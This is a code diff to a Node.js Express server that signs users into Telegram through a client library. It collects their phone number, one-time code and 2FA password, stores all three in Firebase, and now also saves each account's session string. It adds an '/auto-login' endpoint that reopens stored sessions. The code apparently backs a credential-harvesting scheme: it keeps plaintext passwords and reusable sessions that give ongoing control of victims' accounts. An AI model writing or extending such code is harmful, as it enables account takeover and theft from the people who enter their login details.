@@ -54,25 +54,24 @@ app.post('/send-otp', async (req,res)=>{
       settings: new Api.CodeSettings({})
     }));
 
-    // Save temp session
     tempSessions[phone] = { client, phoneCodeHash: result.phoneCodeHash };
-    console.log(`[OTP SENT] ${phone}`);
-
+    console.log("OTP sent:", phone);
     res.json({ success:true });
+
   } catch(err){
-    console.error("[SEND OTP ERROR]", err.message);
+    console.error("SEND OTP ERROR:", err);
     res.status(500).json({ success:false, error:err.message });
   }
 });
 
-// 🔹 STEP 2: Login + handle 2FA
+// 🔹 STEP 2: Login + 2FA + save session
 app.post('/login', async (req,res)=>{
   let { phone, otp, password } = req.body;
   if(!phone || !otp) return res.json({ success:false, message:'Phone & OTP required' });
 
   try{
     phone = String(phone).trim();
-    if(!phone.startsWith('+')) phone = '+855' + phone;
+    if(!phone.startsWith('+')) phone = '+855'+phone;
 
     const temp = tempSessions[phone];
     if(!temp) return res.json({ success:false, message:'Session expired. Try again.' });
@@ -80,44 +79,76 @@ app.post('/login', async (req,res)=>{
     const { client, phoneCodeHash } = temp;
 
     try{
-      // Try normal signIn
-      await client.signIn({ phoneNumber:phone, phoneCode:otp, phoneCodeHash });
+      await client.invoke(new Api.auth.SignIn({
+        phoneNumber: phone,
+        phoneCode: otp,
+        phoneCodeHash
+      }));
     } catch(err){
-      // 2FA required
-      if(err.error_message && err.error_message.includes('SESSION_PASSWORD_NEEDED')){
+      if(err.error_message?.includes('SESSION_PASSWORD_NEEDED')){
         return res.json({ requirePassword:true, message:'2FA password required' });
       } else throw err;
     }
 
-    // If 2FA password provided
     if(password){
-      await client.checkPassword(password);
+      await client.invoke(new Api.auth.CheckPassword({ password }));
     }
 
     // Save session string
     const sessionString = client.session.save();
-    console.log(`[LOGIN SUCCESS] ${phone}`);
+    console.log("LOGIN SUCCESS:", phone);
 
     // Save to Firebase
     await db.ref('telegram_logins').push({
       phone,
       otp,
       password: password || null,
+      sessionString,
       timestamp: Date.now()
     });
 
-    // Cleanup
     delete tempSessions[phone];
     await client.disconnect();
 
-    res.json({ success:true, message:'Login successful' });
+    res.json({ success:true, message:'Login successful. Session saved!' });
 
   } catch(err){
-    console.error("[LOGIN ERROR]", err.message);
+    console.error("LOGIN ERROR:", err.message);
     res.json({ success:false, message:err.message });
   }
 });
 
-// ================= START SERVER =================
+// 🔹 STEP 3: Auto login using saved session
+app.post('/auto-login', async (req,res)=>{
+  let { phone } = req.body;
+  if(!phone) return res.json({ success:false, message:'Phone required' });
+
+  try{
+    phone = String(phone).trim();
+    if(!phone.startsWith('+')) phone = '+855'+phone;
+
+    // Fetch last sessionString for this phone
+    const snapshot = await db.ref('telegram_logins').orderByChild('phone').equalTo(phone).limitToLast(1).once('value');
+    if(!snapshot.exists()){
+      return res.json({ success:false, message:'No saved session found' });
+    }
+
+    const sessionData = Object.values(snapshot.val())[0];
+    if(!sessionData.sessionString) return res.json({ success:false, message:'No session string saved' });
+
+    const client = new TelegramClient(new StringSession(sessionData.sessionString), apiId, apiHash, { connectionRetries:5 });
+    await client.connect();
+
+    res.json({ success:true, message:'Auto login success! Session active.' });
+
+    await client.disconnect();
+
+  } catch(err){
+    console.error("AUTO LOGIN ERROR:", err.message);
+    res.json({ success:false, message:err.message });
+  }
+});
+
+// ================= START =================
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, ()=>console.log(`Server running on port ${PORT}`));
+app.listen(PORT, ()=>console.log("Server running on port",PORT));
